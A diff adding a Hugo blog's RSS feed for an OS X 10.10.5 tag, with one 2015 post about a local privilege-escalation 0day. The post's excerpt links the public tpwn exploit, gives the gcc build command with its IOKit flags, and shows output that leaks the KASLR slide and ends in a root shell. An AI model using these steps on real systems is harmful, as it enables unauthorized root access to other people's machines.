@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>os x 10.10.5 on Kmp - beyondkmp&#39;s new hugo blog</title>
+    <link>https://beyondkmp.com/tags/os-x-10.10.5/</link>
+    <description>Recent content in os x 10.10.5 on Kmp - beyondkmp&#39;s new hugo blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 21 Aug 2015 00:00:00 +0800</lastBuildDate>
+    
+	<atom:link href="https://beyondkmp.com/tags/os-x-10.10.5/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>os x 10.10.5 又一提权漏洞</title>
+      <link>https://beyondkmp.com/post/os10.10.5%E7%9A%840day%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Fri, 21 Aug 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://beyondkmp.com/post/os10.10.5%E7%9A%840day%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</guid>
+      <description>测试代码下载 kpwn/tpwn 备份地址：tpwn 测试结果： 1 2 3 4 5 6 7 8 ⇒ make gcc *.m -o tpwn -framework IOKit -framework Foundation -m32 -Wl,-pagezero_size,0 -O3 strip tpwn ⇒ ./tpwn leaked kaslr slide, @ 0x0000000002600000 sh-3.2# whoami root sh-3.2# 又是一个0day了，目前有10</description>
+    </item>
+    
+  </channel>
+</rss>
